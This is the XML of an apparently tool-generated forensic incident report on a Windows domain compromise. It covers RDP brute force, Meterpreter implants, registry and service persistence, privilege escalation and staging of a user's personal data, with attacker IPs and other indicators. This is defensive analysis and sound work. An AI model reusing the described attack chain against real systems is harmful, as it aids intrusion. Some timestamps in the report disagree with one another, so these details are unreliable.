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1F3864"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>INCIDENT RESPONSE REPORT</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>Forensic analysis: test04</w:t>
      </w:r>
    </w:p>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Case</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>test04</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Main system</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>DESKTOP-SDN1RPT.C137.local</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>COMPROMISED: confirmed intrusion through RDP with domain credentials. The attacker deployed Metasploit/Meterpreter on DESKTOP-SDN1RPT, set up two persistence mechanisms (only the Run key has fired so far), got SYSTEM, collected and staged personal data, and probably exfiltrated it. The domain C137.local must be considered fully compromised: the Domain Administrator (-500) account was abused, and the DC 10.42.85.10 itself ran the same payload.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Trace period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2019-12-06 16:57:00 → 2020-09-19 05:16:48.097557 (99.8 % of the events; full range 2001-01-01 00:00:00 → 2020-09-19 05:38:57.828520)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Incident window (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 20:42:27 → 2020-09-19 06:09:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical: 9, High: 11, Medium: 3, Low: 2, Informational: 7</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report date</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-25 20:19 UTC</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Classification</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>CONFIDENTIAL: TLP:AMBER</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Production</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report generated by Sleuthline (analyze.py) with the assistance of a language model. Model: anthropic / claude-opus-5-5.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>Disclaimer: this report was produced automatically. Every finding is linked to verifiable records of the case database ("Reference" column) and to the original path of the artifact. It must be reviewed and validated by an analyst before any distribution or decision.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Table of contents</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
        <w:instrText xml:space="preserve">TOC \o "1-3" \h \z \u</w:instrText>
        <w:fldChar w:fldCharType="separate"/>
        <w:t>Table of contents: right-click &gt; Update Field (or F9) to display it.</w:t>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>1. Executive summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Verdict: COMPROMISED: confirmed intrusion through RDP with domain credentials. The attacker deployed Metasploit/Meterpreter on DESKTOP-SDN1RPT, set up two persistence mechanisms (only the Run key has fired so far), got SYSTEM, collected and staged personal data, and probably exfiltrated it. The domain C137.local must be considered fully compromised: the Domain Administrator (-500) account was abused, and the DC 10.42.85.10 itself ran the same payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>On 2020-09-19 (UTC; the host is set to Pacific time, UTC-7), an external attacker at 194.61.24.102 took over the C137.local domain and then the workstation DESKTOP-SDN1RPT (10.42.85.115).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**How the attacker got in**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At about 03:19 UTC the attacker scanned the domain controller CITADEL-DC01 (10.42.85.10) and brute-forced its Administrator account over RDP.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 03:24 the DC downloaded coreupdater.exe and opened a Meterpreter session to 203.78.103.109:443.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 03:36:24 the attacker opened an RDP session from the DC to the workstation as C137\Administrator. That account belongs to Domain Admins and Enterprise Admins.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**What the attacker did in that RDP session (03:36–03:52)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Turned off Microsoft Defender real-time protection, cloud reporting (MAPS) and sample submission.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Downloaded coreupdater.exe (SHA256 10f3b920…cfda6) with Edge from http://194.61.24.102/ and moved it to C:\Windows\System32.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Ran it at 03:40:49, which opened an encrypted Meterpreter channel to 203.78.103.109:443.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Moved the implant into spoolsv.exe (running as SYSTEM, holding a handle to lsass) and used getsystem (temporary service "nehgye").</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Set up two persistence mechanisms:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - an auto-start LocalSystem service, "coreupdater";</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - a fileless HKLM Run value, "coreupdate", that loads PowerShell shellcode stored in HKLM\Software\q9Z1bssi.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Browsed every user profile, opened mortysmith's sensitive files (Social Security Number, Plans, Thoughts, Portal_gun.png), zipped them as loot.zip, and permanently deleted the archive at 03:47:09.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**After the session**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 05:08 the Domain Admin ricksanchez logged on. This fired the Run-key loader and opened a second Meterpreter session in his Domain Admin context. That session was still live when the responder collected evidence (05:09–05:13, FTK Imager from USB E:).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Impact**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Full SYSTEM and Domain/Enterprise Admin control of the workstation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Probable theft of mortysmith's PII. The archive was small and most likely left through the encrypted C2, but this cannot be proven at content level.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Domain-wide credential exposure.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Confidence**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- High for the attack chain. Disk (EVTX, Prefetch, Amcache, $MFT/$J, registry, SRUM), memory (Volatility) and network capture (Suricata) all corroborate it independently.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Probable for the exfiltration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Key figures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Findings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>32 (critical: 9, high: 11, medium: 3, low: 2, informational: 7)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Key timeline events</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>28</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Indicators of compromise</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Questions answered</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>0 / 0 asked in the guidance</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>First / last key event (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-18 21:42:27 → 2020-09-19 05:09:56</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Main findings</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="794"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="1134"/>
        <w:gridCol w:w="4535"/>
        <w:gridCol w:w="2268"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>ID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Severity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Confidence</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-009</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Privilege escalation: Meterpreter getsystem named-pipe impersonation service "nehgye"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740 → 2020-09-19 03:43:15.054907</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-012</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Execution attribution: coreupdater.exe, cmd.exe and sc.exe launched interactively by C137\Administrator (SID -500) in RDP session 3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-18 22:53:11.065740 → 2020-09-19 04:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-008</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Malware coreupdater.exe downloaded from 194.61.24.102 via Edge, moved to C:\Windows\System32, executed and installed as auto-start service "coreupdater"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571 → 2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-017</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Network ↔ disk ↔ memory: coreupdater.exe HTTP download to 10.42.85.115 hash-identical to Amcache entry; two Meterpreter stage/C2 sessions to 203.78.103.109:443 owned by the host</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:39:58.411571 → 2020-09-19 04:08:45.783080</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-015</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Memory: Meterpreter migrated into spoolsv.exe (PID 2188, SYSTEM) — MZ RWX region, inherited C2 socket to 203.78.103.109:443, handle to lsass.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 02:40:49.936293 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-020</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Persistence #2: auto-start LocalSystem service "coreupdater" (C:\Windows\System32\coreupdater.exe) still registered but not triggered yet (no reboot since install); "nehgye" was transient</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537 → 2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-010</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Persistence fired: HKLM Run "coreupdate" launched hidden PowerShell Metasploit shellcode loader at 05:08 (new C2 session to 203.78.103.109:443)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241 → 2020-09-19 05:08:44.732435</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-019</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Persistence #1: HKLM Run value "coreupdate" + fileless payload in HKLM\Software\q9Z1bssi (Metasploit registry_persistence pattern), written 03:44:03 during the attacker session</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241 → 2020-09-19 05:08:40.797308</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-016</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
            <w:shd w:val="clear" w:color="auto" w:fill="7B0000"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>confirmed</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4535"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Memory: PowerShell PID 3316 (ricksanchez, Domain Admin) hosts reflective Meterpreter payload with a live C2 socket to 203.78.103.109:443</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2020-09-19 04:08:45.483780 → 2020-09-19 05:14:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>F-027</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Attacker GUI workflow for coreupdater.exe: Edge directory listing of 194.61.24.102, Save-As dialog, Explorer move Downloads→System32, clipboard pastes into cmd.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2019-12-07 09:03:44.539499 → 2020-09-19 03:42:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="794"/>
          </w:tcPr>
          <w:p>
            <w:r/>
